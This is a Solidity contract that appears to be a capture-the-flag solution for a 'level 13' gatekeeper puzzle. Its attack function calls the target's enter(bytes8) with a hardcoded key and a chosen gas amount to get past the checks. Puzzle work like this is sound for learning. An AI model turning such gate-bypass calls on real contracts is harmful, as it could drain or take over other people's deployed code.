// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/Test.sol";

contract Level13 {
    function attack(uint256 _gas, address addr) public {
        bytes8 b8 = 0xaB32758500007951;
        (bool b,) = address(addr).call{gas: _gas}(abi.encodeWithSignature("enter(bytes8)", b8));
        // assembly {
        //     d := add(d, 0x04)
        // }
        // console.log(abi.decode(d, (string)));
        require(b);
    }
}
